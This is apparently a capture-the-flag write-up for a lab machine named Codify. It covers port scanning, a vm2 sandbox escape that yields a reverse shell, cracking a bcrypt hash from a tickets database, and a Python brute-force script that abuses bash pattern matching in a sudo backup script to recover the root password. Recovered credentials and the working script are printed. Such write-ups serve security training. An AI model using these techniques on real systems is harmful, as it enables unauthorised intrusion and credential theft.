ME: 10.10.15.8
TARGET: 10.129.47.213

# NMAP

```
└─$ sudo nmap -sC -sV -p- --max-retries=1 -Pn 10.129.47.213 -oN Codify
[sudo] password for xmen: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-24 20:09 -0400
Nmap scan report for 10.129.47.213
Host is up (0.051s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://codify.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Port 80

Added codify.htb to my hosts list

This seems to allow evaluating arbitrary javascript on the server's nodeJS instance. However modules like child_process used in the revshells NodeJS shells are not usable due to being on some kind of blacklist.

Reading the "About Us" page suggests that the vm2 library is being used here to do this code sandboxing and so I looked for vm2 CVEs allowing some kind of sandbox escape to run reverse shells under.

This led to an old GHSA advisory for CVE-2023-30547 (amongst others by the same researcher) at https://github.com/patriksimek/vm2/security/advisories/GHSA-ch3r-j5x3-6q2m

This had a PoC attached at https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244

Running a simple bash revshell as a payload inside the exploit here worked to get a reverse shell as svc

```
┌──(xmen㉿kali)-[~]
└─$ nc -lvnp 9000
listening on [any] 9000 ...
connect to [10.10.15.8] from (UNKNOWN) [10.129.47.213] 51836
bash: cannot set terminal process group (1251): Inappropriate ioctl for device
bash: no job control in this shell
svc@codify:~$ whoami
whoami
svc
svc@codify:~$ id
id
uid=1001(svc) gid=1001(svc) groups=1001(svc)
```

From here I found that the /var/www directory also has another node app with a tickets.db file and some others:

```
svc@codify:/var/www/contact$ ls
ls
index.js
package.json
package-lock.json
templates
tickets.db
```

Reading the tickets.db file showed it has a password hash in it for the joshua user:

```
joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
```

Using john I cracked this hash (by omitting the joshua part of the string for john to recognize the bcrypt hash)

```
└─$ john joshua_hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:05 0.00% (ETA: 2026-09-04 22:42) 0g/s 17.30p/s 17.30c/s 17.30C/s spongebob..junior
spongebob1       (?)     
1g 0:00:01:18 DONE (2026-08-24 20:53) 0.01276g/s 17.19p/s 17.19c/s 17.19C/s teacher..boogie
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

This gives us creds:

```
joshua : spongebob1
```

Used SSH from here to get a shell as joshua

# Shell as Joshua

Running basic enumeration I found a sudo script I can run as root:

```
joshua@codify:~$ sudo -l
[sudo] password for joshua: 
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

Reading this script shows it needs a password and that password is likely also the root user password. However it uses the ```[[[``` operator in bash.

```
joshua@codify:~$ cat /opt/scripts/mysql-backup.sh 
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

According to [stack-overflow](https://serverfault.com/questions/52034/what-is-the-difference-between-double-and-single-square-brackets-in-bash) this means the == used for comparison is a pattern matcher and * will match any characters. This is explained in the article [here](https://mywiki.wooledge.org/BashFAQ/031) on bash test keywords. So this python script can be used to recursively find working prefixes of the password, slowly brute forcing the whole password:

```
import os
import string

def get_next_char(check):
        a = os.system("echo '"+check+"' | "+"sudo /opt/scripts/mysql-backup.sh >/dev/null 2>&1")
        if (a == 0):
                print(check)
                exit()
        for char in string.printable:
                a = os.system("echo '"+check+char+"* ' | "+"sudo /opt/scripts/mysql-backup.sh >/dev/null 2>&1")
                if (a == 0):
                        get_next_char(check+char)

if __name__ == "__main__":
	get_next_char("")

```

Running this as joshua led to the password:

```
joshua@codify:~$ python3 guess.py 
[sudo] password for joshua: 
kljh12k3jhaskjh12kjh3
```

This worked for root user

==DONE==